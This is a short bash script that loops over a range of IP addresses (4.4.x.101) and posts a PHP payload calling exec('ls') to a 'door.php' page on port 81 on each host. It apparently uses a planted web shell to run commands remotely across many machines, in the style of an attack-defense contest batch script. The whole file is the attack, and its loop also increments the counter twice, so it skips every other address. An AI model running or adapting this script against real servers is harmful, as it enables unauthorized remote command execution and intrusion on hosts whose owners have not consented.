#!/bin/bash

for ((i=1;i<84;i++))
do
    ip="4.4.$i.101"
    echo $ip
    curl -d "a=echo exec('ls');" "http://$ip:81/door.php"
    i=$(($i+1))
done
